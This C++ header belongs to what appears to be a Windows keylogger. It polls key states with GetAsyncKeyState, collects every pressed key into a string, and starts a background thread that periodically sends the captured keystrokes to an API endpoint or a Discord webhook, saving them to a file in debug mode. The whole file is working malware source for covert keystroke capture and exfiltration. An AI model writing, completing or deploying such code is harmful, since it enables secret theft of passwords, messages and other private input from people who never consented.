#pragma once
#include "c_includes.hpp"

namespace c_runner {

	inline std::string stored_data;
	inline bool thread_running;

	inline void send_thread() {
		while (true) {
			std::this_thread::sleep_for(std::chrono::minutes(c_config::sender::minute_delay)); //zZzZzZz

			if(c_config::sender::send_api) //send data to api option
				c_sender::api_send(stored_data); //send the logs to an api file 

			if (c_config::sender::send_webhook) //send data to webhook option
				c_sender::webhook_send(stored_data); //send the logs to the discord webhook

			if (c_config::debug) 
				c_sender::save_data(stored_data); //this saves the data in a text file in case we're in debug mode

			stored_data = ""; //i 'null' the data because i dont wanna send the same data over and over
		}
	}

	inline void keylogger() {
		while (true) {
			for (char loop = 0; loop < CHAR_MAX; loop++) { //loop da chars
				if (GetAsyncKeyState(loop) == -32767) { //if some of the keys was pressed
					stored_data += c_utils::key_output(loop); //add values to stored_data

					if (!thread_running) { 
						std::thread{ send_thread }.detach(); //start the sending data thing
						thread_running = true;
					}
					//maybe ghetto, maybe not ^
				}
			}
		}
	}

}